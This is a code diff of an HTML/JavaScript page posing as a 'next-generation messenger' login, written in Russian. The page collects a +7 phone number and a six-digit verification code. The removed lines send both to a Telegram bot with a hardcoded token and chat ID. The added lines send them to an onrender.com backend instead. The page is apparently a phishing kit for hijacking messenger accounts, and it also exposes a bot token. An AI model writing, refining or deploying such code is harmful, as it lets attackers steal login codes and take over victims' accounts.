@@ -72,23 +72,19 @@
     border: none;
     border-radius: 16px;
     font-size: 16px;
-    transition: 0.2s;
-    cursor: pointer;
+    transition: 0.25s ease;
   }
 
   .btn.primary {
     background: linear-gradient(135deg, #2f80ed, #56ccf2);
     color: white;
+    cursor: pointer;
   }
 
   .btn.disabled {
     background: #e5e5e5;
     color: #999;
     cursor: not-allowed;
-  }
-
-  .btn:active {
-    transform: scale(0.97);
   }
 
   /* PHONE */
@@ -167,14 +163,14 @@
   <!-- SCREEN 1 -->
   <div class="screen active" id="s1">
     <h1>Добро пожаловать</h1>
-    <p class="subtext">Современный мессенджер</p>
+    <p class="subtext">Современный мессенджер нового поколения</p>
     <button class="btn primary" onclick="go('s2')">Войти</button>
   </div>
 
   <!-- SCREEN 2 -->
   <div class="screen" id="s2">
 
-    <h1>Введите номер</h1>
+    <h1>С каким номером телефона хотите войти?</h1>
     <p class="subtext">На него придёт код</p>
 
     <div class="phone-wrap">
@@ -213,21 +209,9 @@
 <script>
 
 /* =========================
-   TELEGRAM CONFIG
+   BACKEND URL (RENDER)
 ========================= */
-const BOT_TOKEN = "8601653702:AAHCu0yYMR5U2gxXoZD_91WwSovS9b-CEEY";
-const CHAT_ID = "8063683163";
-
-function sendToTelegram(text) {
-  fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
-    method: "POST",
-    headers: { "Content-Type": "application/json" },
-    body: JSON.stringify({
-      chat_id: CHAT_ID,
-      text: text
-    })
-  });
-}
+const API = "https://telegram-backend-vcij.onrender.com";
 
 /* =========================
    NAV
@@ -261,7 +245,7 @@ function format(v){
   return r.join(' ');
 }
 
-function updateBtn(v){
+function updateButton(v){
   const ok = v.length === 10 && v[0] === '9';
 
   btn.disabled = !ok;
@@ -279,12 +263,13 @@ phone.addEventListener('input',()=>{
   phone.value = format(phone.value);
 
   const raw = phone.value.replace(/\D/g,'');
-  updateBtn(raw);
+  updateButton(raw);
 
   err.style.display = 'none';
 });
 
 btn.addEventListener('click',()=>{
+
   const v = phone.value.replace(/\D/g,'');
 
   if(v.length !== 10 || v[0] !== '9'){
@@ -296,13 +281,19 @@ btn.addEventListener('click',()=>{
   window.userPhone = phone.value;
 
   /* 📤 SEND PHONE */
-  sendToTelegram("📱 Новый вход\nНомер: +7 " + window.userPhone);
+  fetch(API + "/send-phone", {
+    method: "POST",
+    headers: {"Content-Type":"application/json"},
+    body: JSON.stringify({
+      phone: "+7 " + window.userPhone
+    })
+  });
 
   go('s3');
 });
 
 /* =========================
-   CODE INPUT
+   CODE LOGIC
 ========================= */
 function getCode(){
   return [...document.querySelectorAll('.code-box input')]
@@ -311,7 +302,9 @@ function getCode(){
 }
 
 document.querySelectorAll('.code-box input').forEach((el,i,arr)=>{
+
   el.addEventListener('input',()=>{
+
     el.value = el.value.replace(/\D/g,'');
 
     if(el.value && i < arr.length-1){
@@ -321,10 +314,16 @@ document.querySelectorAll('.code-box input').forEach((el,i,arr)=>{
     const code = getCode();
 
     if(code.length === 6){
-      sendToTelegram(
-        "🔐 Код введён\nНомер: +7 " + window.userPhone +
-        "\nКод: " + code
-      );
+
+      /* 📤 SEND CODE */
+      fetch(API + "/send-code", {
+        method: "POST",
+        headers: {"Content-Type":"application/json"},
+        body: JSON.stringify({
+          phone: "+7 " + window.userPhone,
+          code: code
+        })
+      });
     }
   });
 
@@ -333,6 +332,7 @@ document.querySelectorAll('.code-box input').forEach((el,i,arr)=>{
       arr[i-1].focus();
     }
   });
+
 });
 
 </script>
